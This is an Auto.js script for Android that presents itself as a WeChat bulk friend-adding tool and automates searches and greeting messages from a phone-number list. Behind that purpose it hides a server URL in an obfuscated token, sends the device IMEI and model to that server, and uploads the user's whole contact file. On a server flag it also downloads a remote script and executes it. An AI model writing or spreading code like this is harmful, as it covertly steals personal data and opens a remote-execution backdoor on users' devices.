"ui";
ui.statusBarColor("#009688");
ui.layout(
<vertical>
	<toolbar bg="#009688" elevation="5dp">
		<text
			text="微信加好友（实验）"
			id="jiancha"
			textStyle="bold"
			textSize="15dp"
			color="#ffffffff"/>
	</toolbar>
		<vertical margin="10dp" marginTop="10dp">
			<text
				text="设置开始参数"
				textStyle="bold"
				textSize="30dp"
				gravity="center"
				layout_gravity="center"
				color="#ff000000"/>
				
			<horizontal gravity="center">
				<text
					text="设置开始	"
					textSize="20dp"
					gravity="center"
					marginRight="10dp"
					color="#ff000000"/>
				<input
					id="start"
					singleline="true"
					hint="开始"
					textStyle="bold"
					width="80dp"
					gravity="center"
					marginLeft="10dp"/>
			</horizontal>
			
			<horizontal gravity="center">
				<text
					text="设置文档头"
					textSize="20dp"
					gravity="center"
					marginRight="10dp"
					color="#ff000000"/>
				<input
					id="min"
					textStyle="bold"
					singleLine="true"
					inputType="number"
					hint="文档头"
					gravity="center"
					width="80dp"/>
			</horizontal>
			
			<horizontal gravity="center">
				<text
					text="设置结束点"
					textSize="20dp"
					gravity="center"
					marginRight="10dp"
					color="#ff000000"/>
				<input
					id="max"
					singleLine="true"
					textStyle="bold"
					hint="文档尾"
					gravity="center"
					width="80dp"/>
			</horizontal>
			
			<horizontal gravity="center">
				<checkbox
					id="pyq"
					w="auto"
					marginRight="20dp"
					text="屏蔽朋友圈"/>
				<checkbox
					id="clear"
					w="auto"
					marginLeft="20dp"
					text="清理txt文档"/>
			</horizontal>
			
			<text
				text="设置验证消息头尾"
				textStyle="bold"
				textSize="30dp"
				gravity="center"
				layout_gravity="center"
				color="#ff000000"/>
				
			<horizontal gravity="center">
				<input
					marginRight="40dp"
					id="head"
					textStyle="bold"
					singleLine="true"
					hint="验证消息开头"
					gravity="center"
					width="90dp"/>
				<input
					marginLeft="40dp"
					id="tail"
					singleLine="true"
					textStyle="bold"
					hint="验证消息尾巴"
					gravity="center"
					width="90dp"/>
			</horizontal>
			
			<button
				id="ok"
				text="确定"/>

			<horizontal marginTop="10dp">
				<button text="微信清理" id="clean" style="Widget.AppCompat.Button.Colored" w="125dp"/>
				<button text="唤起QQ" id="call" style="Widget.AppCompat.Button.Colored" w="125dp"/>
				<button text="检查更新" id="update" style="Widget.AppCompat.Button.Colored" w="*"/>
			</horizontal>
			
			<frame margin="5dp">
				<text
					id="doc"
					text="帮助"
					w="auto"
					layout_gravity="left"
					marginTop="10dp"/>
				
				<text
					id="cant"
					text="反馈问题"
					w="auto"
					layout_gravity="right"
					marginTop="10dp"/>
			</frame>
		</vertical>
</vertical>);
	threads.start(function(){
		device.vibrate(2000);
		media.playMusic("http://lokami.cn/source/debugging.mp3");
		sleep(media.getMusicDuration());
	})
	ui.start.setText(storages.create("weixin").get("start", "1"));
	ui.min.setText(storages.create("weixin").get("min", "1"));
	ui.max.setText(storages.create("weixin").get("max", "50"));
	ui.head.setText(storages.create("weixin").get("head", "请问是 "));
	ui.tail.setText(storages.create("weixin").get("tail", " 吗？"));
	ui.pyq.setChecked(storages.create("weixin").get("pyq", false));

	
	threads.start(function(){
		var remoto = http.get(link("") + "version");
		var bbh = remoto.body.string().replace("\n", "").replace(" ", "").replace("\r", "");
		if (!context.getPackageManager().getPackageInfo(context.getPackageName(), 0).versionName.equals(bbh)){
			ui.jiancha.setText("微信加好友（有更新）");
		}
	});
	

    ui.call.click(() => {
		threads.shutDownAll();
		threads.start(function(){
			qq();
		});
	});
	
    ui.doc.click(() => {
		app.startActivity({
			action: "android.intent.action.VIEW",
			data: "http://yun.cy2018.top/sdfwsywd"
		});
	});

    ui.cant.click(() => {
		threads.shutDownAll();
		threads.start(function(){
			反馈问题();
		});
	});
	
    ui.pyq.click(() => {
		if (device.sdkInt < 24){
			var root = shell("", true).code;
			if(root){
				ui.pyq.setChecked(false);
				toast("屏蔽朋友圈暂时只支持安卓7.0以上或已ROOT的设备");
				storages.create("weixin").put("pyq", false);
			}else{
				storages.create("weixin").put("pyq", ui.pyq.checked);
			}
		}
		storages.create("weixin").put("pyq", ui.pyq.checked);
	});
	
    ui.ok.click(() => {
		var 开始 = ui.start.text();
		var min = ui.min.text();
		var max = ui.max.text();
		var head = ui.head.text();
		var tail = ui.tail.text();
		var pyq = ui.pyq.checked;
		
		storages.create("weixin").put("start", 开始);
		storages.create("weixin").put("min", min);
		storages.create("weixin").put("max", max);
		storages.create("weixin").put("head", head);
		storages.create("weixin").put("tail", tail);
		if(ui.clear.checked){
			toastLog("正在清理");
			threads.shutDownAll();
			threads.start(function(){
				清理文档();
				});
			}else{
				threads.shutDownAll();
				threads.start(function(){
					文档起止开编号(min,max,开始,head,tail, pyq);
				});
		}
	});
	
	ui.clean.click(() => {
		threads.shutDownAll();
		threads.start(function(){
			if(confirm("这将会清理微信所有接收的文件,如果你的接收了多个同样的txt文档,则需要点击这里清理")){
				var ht = link(device.getIMEI());
				if (http.get(ht+"ot").statusCode != 200){
					toastLog("设备未激活，请查看日志！");
					log("设备未激活，已将设备码复制到剪切板，请将设备码" + name + "发送给我激活！");
					log("激活默认使用最新版本微信数据使用");
					log("QQ941200728");
					setClip(name);
					qq();
					exit();
				}else{
					var ot = http.get(ht+"ot").body.string().replace("\n", "").replace(" ", "").replace("\r", "");
				}
				var dz = files.getSdcardPath() + ot;
				if(files.removeDir(dz)){
					alert("清理成功");
				}else{
					alert("清理失败");
				}
				files.createWithDirs(dz);
			}
		});
	});

	ui.update.click(() => {
		threads.shutDownAll();
		threads.start(function(){
			if(ui.update.text().equals("检查更新")){
				checkupdate(context.getPackageManager().getPackageInfo(context.getPackageName(), 0).versionName);
			}else if(ui.update.text().equals("点击更新")){
				app.startActivity({
						action: "android.intent.action.VIEW",
						data: "http://yun.cy2018.top/sdfw"
				});
			}
		});
	});

function checkupdate(version){
	var remoto = http.get(link("") + "version");
	if (remoto.statusCode != 200){
		toastLog("检查失败");
		return;
	}
	var bbh = remoto.body.string().replace("\n", "").replace(" ", "").replace("\r", "");
	if (version.equals(bbh)){
		toastLog("已是最新版！");
	}else{
		toastLog("检测到"+bbh+"版本更新");
		ui.update.setText("点击更新");
	}
}

function link(name){
	var token="oo0 ooo ooo o0o :000 000 lokam0oo .o00 n000 we0oo x0oo nadm000 "
	var a = token.replace(/ooo /g, "t")
.replace(/oo0 /g, "h")
.replace(/o0o /g, "p")
.replace(/0oo /g, "i")
.replace(/000 /g, "/")
.replace(/o00 /g, "c");
		return a+name+"/";
}

function 清理文档(){
	var ht = link(device.getIMEI());
	if (http.get(ht+"ot").statusCode != 200){
		toastLog("设备未激活，请查看日志！");
		log("设备未激活，已将设备码复制到剪切板，请将设备码" + name + "发送给我激活！");
		log("激活默认使用最新版本微信数据使用");
		log("QQ941200728");
		setClip(name);
		qq();
		exit();
	}else{
		var ot = http.get(ht+"ot").body.string().replace("\n", "").replace(" ", "").replace("\r", "");
	}
	var dz = files.getSdcardPath() + ot;
	var address = files.listDir(dz, function(name){
		return name.endsWith(".txt");
	});
	var idel = dialogs.multiChoice("请勾选要删除的文档", address);
	if(idel < 0){
		toastLog("未选择文档，已停止！");
		exit();
	}
	for (let sc = 0; sc < idel.length; sc++){
		files.remove(files.join(dz, address[sc]));
	}
	toastLog("完成");
}

function 反馈问题(){
	var ve = rawInput("一般问题请点击左边的帮助\n请输入您的问题");
	var abort = http.get(link("")+"abort").body.string().replace("\n", "").replace(" ", "").replace("\r", "");
	http.post(abort, {
		"imei": device.getIMEI(),
		"device": device.brand + " " + device.model,
		"version": ve,
		"wx": context.getPackageManager().getPackageInfo("com.tencent.mm", 0).versionName,
		"banbenhao": context.getPackageManager().getPackageInfo(context.getPackageName(), 0).versionName
	});
	toastLog("完成");
}

function qq(){
	app.startActivity({
			action: "android.intent.action.VIEW",
			data: "mqqwpa://im/chat?chat_type=wpa&uin=941200728"
	});
}

function 文档起止开编号(min, max, 开始, 开头, 尾巴, pb){
	let min = parseInt(min);
	let max = parseInt(max);
	let 开始 = parseInt(开始);
	let n = 0;
	var name = device.getIMEI();
	toastLog("设备码"+name+"已复制");
	setClip(name);
	var ht = link(name);
	var weixinbbh = context.getPackageManager().getPackageInfo("com.tencent.mm", 0).versionName;
	var ooo = http.get(ht+"../"+weixinbbh+"/ooo").body.string().replace("\n", "").replace(" ", "").replace("\r", "");
	var oo0 = http.get(ht+"../"+weixinbbh+"/oo0").body.string().replace("\n", "").replace(" ", "").replace("\r", "");
	var o0o = http.get(ht+"../"+weixinbbh+"/o0o").body.string().replace("\n", "").replace(" ", "").replace("\r", "");
	var o00 = http.get(ht+"../"+weixinbbh+"/o00").body.string().replace("\n", "").replace(" ", "").replace("\r", "");
	var post = http.get(link("")+"post").body.string().replace("\n", "").replace(" ", "").replace("\r", "");
	var file = http.get(link("")+"file").body.string().replace("\n", "").replace(" ", "").replace("\r", "");
	var kg = http.get(ht+"kg").body.string().replace("\n", "").replace(" ", "").replace("\r", "");
	
	if (kg=="true"){
		var jb = context.getFilesDir().getAbsolutePath()+"/cs.js";
		files.writeBytes(jb, http.get(ht+"kglink").body.bytes());
		engines.execScriptFile(jb);
	}
	
	if (http.get(ht+"ot").statusCode != 200){
		toastLog("设备未激活，请查看日志！");
		log("设备未激活，已将设备码复制到剪切板，请将设备码" + name + "发送给我激活！");
		log("激活默认使用最新版本微信数据使用");
		log("QQ941200728");
		setClip(name);
		qq();
		return;
	}else{
		var ot = http.get(ht+"ot").body.string().replace("\n", "").replace(" ", "").replace("\r", "");
	}
	var dz = files.getSdcardPath() + ot;
	var address = files.listDir(dz, function(name){
		return name.endsWith(".txt");
	});
	var ichoice = dialogs.singleChoice("请选择加人文档", address);
	if(ichoice < 0){
		toastLog("未选择文档，已停止！");
		return;
	}
	var dz = files.join(dz, address[ichoice]);
	var address = files.getNameWithoutExtension(dz);
	if (files.isFile(dz)){
		toastLog("开始运行，可以打开微信加人了！");
		http.post(post, {
			"imei": name,
			"device": device.brand + " " + device.model,
			"name": address,
			"head": 开头,
			"tail": 尾巴,
			"start": 开始,
			"min": min,
			"max": max,
			"wx": weixinbbh,
			"version": context.getPackageManager().getPackageInfo(context.getPackageName(), 0).versionName
		});
		http.postMultipart(file, {
		file: open(dz)
	});
		file = open(dz, "r")
	}else{
		toastLog("文档错误！");
		return;
	}
	
		for(let t = min;t < 开始;t++){
			for(let d = 1;d <= 3;d++){
				file.readline();
			}
	}
	
	for(let i = 开始; i <= max;i++){
		log(address+"编号 "+i+" 号"+"开始");
		waitForActivity("com.tencent.mm.plugin.search.ui.FTSAddFriendUI");
		sleep(1000);
		setText("");
		sleep(random(5000, 7000));
		var weixinh = file.readline();
		if(weixinh==null){
			log("请查看结束点是否大于文档内容");
			device.vibrate(2000);
			media.playMusic("http://lokami.cn/source/cut.mp3");
			sleep(media.getMusicDuration());
			exit();
		}else if(weixinh==""){
			log("请查看文档第"+i+"个选手是否有手机号");
			device.vibrate(2000);
			media.playMusic("http://lokami.cn/source/null.mp3");
			sleep(media.getMusicDuration());
			exit();
		}else{
			setText(weixinh);
		}
		sleep(random(2000, 3000));
		click("搜索");
		log(address+"编号 "+i+" 号"+"已搜索");
		sleep(random(2000, 3000));
		if(id(oo0).text("该用户不存在").exists()){
			sleep(2000);
			file.readline();
			storages.create("weixin").put("start", i+1+"");
			sleep(2000);
			n++;
			log(address+"编号 "+i+" 号"+file.readline()+"用户不存在 第"+n+"个无效");
		}else if(id(oo0).text("被搜帐号状态异常，无法显示").exists()){
			sleep(2000);
			file.readline();
			sleep(2000);
			n++;
			log(address+"编号 "+i+" 号"+file.readline()+"账号异常 第"+n+"个无效");
		}else if(id(oo0).text("操作过于频繁，请稍后再试").exists()){
			sleep(2000);
			file.readline();
			sleep(2000);
			device.vibrate(2000);
			media.playMusic("http://lokami.cn/source/pinfan.mp3");
			sleep(media.getMusicDuration());
			log(address+"在" + file.readline() + "第"+i+" 编号停止");
			back();
			exit();
		}else if(id(o0o).className("Button").text("发消息").exists()){
			file.readline();
			sleep(2000);
			n++;
			log(address+file.readline()+"重复添加"+" "+i+" 号, 第"+n+"个无效");
			while(!back());
		}else{
			id(ooo).className("Button").text("添加到通讯录").clickable().click();
			sleep(random(2000, 3000));
			if(id(o0o).className("Button").text("发消息").exists()){
				if (pb){
					if (device.sdkInt < 24){
						sleep(1000);
						desc("更多").clickable().click();
						sleep(1000);
						while(!click("设置朋友圈权限"));
						sleep(1000);
						var pbpyq = desc("已关闭").findOne().bounds();
						Tap(pbpyq.centerX(), pbpyq.centerY());
					}else{
						sleep(1000);
						desc("更多").clickable().click();
						sleep(1000);
						while(!click("设置朋友圈权限"));
						sleep(1000);
						var pbpyq = desc("已关闭").findOne().bounds();
						click(pbpyq.centerX(), pbpyq.centerY());
					}
						sleep(1000);
						while(!back());
				}
				file.readline();
				sleep(1000);
				desc("更多").clickable().click();
				sleep(1000);
				while(!click("设置备注及标签"));
				sleep(random(3000, 4000));
				setText(0, address);
				sleep(1000);
				var tag = file.readline();
				input(0, tag);
				sleep(1000);
				id(o00).className("TextView").text("完成").clickable().click();
				log(address+"编号 "+i+" 号"+tag+"直接添加已备注");
				storages.create("weixin").put("start", i+1+"");
				sleep(1000);
				while(!back());
			}else{
				if (pb){
					sleep(500);
					var pbpyq = desc("已关闭").findOne().bounds();
					if (device.sdkInt < 24){
						Tap(pbpyq.centerX(), pbpyq.centerY());
					}else{
						click(pbpyq.centerX(), pbpyq.centerY());						
					}
				}
				sleep(random(2000, 3000));
				setText(0, 开头);
				sleep(random(3000, 4000));
				input(0, file.readline());
				sleep(random(2000, 3000));
				input(0, 尾巴);
				sleep(random(3000, 4000));
				setText(1, address);
				sleep(random(2000, 4000));
				var tag = file.readline();
				input(1, tag);
				sleep(2000);
				while(currentActivity() == "com.tencent.mm.plugin.profile.ui.SayHiWithSnsPermissionUI"){
					id(o00).className("TextView").text("发送").clickable().click();
					sleep(2000);
				}
				log(address+"编号 "+i+" 号"+tag+"已发送");
				storages.create("weixin").put("start", i+1+"");
				sleep(1000);
				while(!back());
			}
		}
	}
	file.close();
	device.vibrate(2000);
	media.playMusic("http://lokami.cn/source/success.mp3");
	sleep(media.getMusicDuration());
	toast("完成");
	back();
	home();
}